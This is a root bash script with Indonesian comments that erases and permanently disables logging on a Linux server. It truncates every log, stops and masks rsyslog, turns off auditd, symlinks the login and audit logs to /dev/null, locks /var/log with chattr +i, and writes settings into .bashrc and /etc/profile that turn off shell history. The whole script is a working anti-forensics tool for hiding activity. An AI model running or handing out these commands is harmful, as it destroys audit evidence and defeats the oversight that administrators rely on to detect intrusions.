#!/bin/bash

# sed -i 's/\r$//' bersih1.sh
# chmod +x bersih1.sh
# ./bersih1.sh
# Pastikan skrip dijalankan sebagai root
if [ "$EUID" -ne 0 ]; then 
  echo "Harus akses root di jalankan"
  exit
fi

echo "--- Memulai proses pembersihan log dan penguncian jejak log  ---"

unset HISTFILE && export HISTSIZE=0 && export HISTFILE=/dev/null && export HISTFILESIZE=0 && set +o history && export HISTCONTROL=ignorespace
# 1. Mengosongkan semua file log yang ada saat ini
find /var/log/ -type f -exec truncate -s 0 {} \;
rm -rf /tmp/*
sudo sync; echo 3 | sudo tee /proc/sys/vm/drop_caches
chattr -i -R /var/log/
chattr -a -R /var/log/

# 2. Modifikasi /etc/rsyslog.conf secara otomatis (Menambahkan komentar #)
# Menggunakan sed untuk mencari baris spesifik dan menambahkan # di depannya
sed -i 's/^[^#]*\/var\/log\/messages/# &/' /etc/rsyslog.conf
sed -i 's/^[^#]*\/var\/log\/secure/# &/' /etc/rsyslog.conf

# 3. Menghentikan dan mengunci layanan Logging
systemctl restart rsyslog
systemctl stop rsyslog
systemctl disable rsyslog
systemctl mask rsyslog

# 4. Mematikan auditd dan sistem audit
systemctl stop auditd 2>/dev/null
service auditd stop 2>/dev/null
auditctl -e 0

# 5. Membuat "Lubang Hitam" (/dev/null) untuk log biner & audit
logs=("/var/log/btmp" "/var/log/wtmp" "/var/log/lastlog" "/var/log/audit/audit.log")
for logfile in "${logs[@]}"; do
    rm -f "$logfile"
    ln -s /dev/null "$logfile"
    echo "Symlink created for $logfile"
done

# 6. Mematikan logrotate untuk btmp agar tidak error
if [ -f /etc/logrotate.d/btmp ]; then
    sed -i 's/^/# /' /etc/logrotate.d/btmp
fi

# 7. Mengatur hak akses folder log menjadi sangat ketat
chmod -R 000 /var/log/
chown root:root -R /var/log/

# 8. Kunci folder log secara permanen (Immutable)
# Catatan: Gunakan +i agar benar-benar tidak bisa diubah sama sekali
chattr +i -R /var/log/

# Kumpulan perintah untuk .bashrc dan /etc/profile
COMMANDS="
unset HISTFILE
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
set +o history
export HISTCONTROL=ignorespace"

# Perintah untuk .bash_logout
LOGOUT_COMMAND="> ~/.bash_history"

echo "Memulai proses konfigurasi anti-history tingkat lanjut..."

# 1. Tambahkan ke ~/.bashrc
echo "$COMMANDS" >> ~/.bashrc
echo "[+] Berhasil menambahkan ke ~/.bashrc"

# 2. Tambahkan ke /etc/profile
if [ "$EUID" -ne 0 ]; then
  echo "$COMMANDS" | sudo tee -a /etc/profile > /dev/null
else
  echo "$COMMANDS" >> /etc/profile
fi
echo "[+] Berhasil menambahkan ke /etc/profile"

# 3. Tambahkan ke ~/.bash_logout
echo "$LOGOUT_COMMAND" >> ~/.bash_logout
echo "[+] Berhasil menambahkan ke ~/.bash_logout"

# 4. Jalankan source
source ~/.bashrc
# Note: source pada .bash_logout biasanya tidak memberikan output visual, 
# tapi kita jalankan sesuai permintaan untuk memastikan sintaks diterima.
source ~/.bash_logout 2>/dev/null

echo "--- SELESAI: Server sekarang dalam mode 'Silent dan bersih dari log' ---"
history -c && history -w
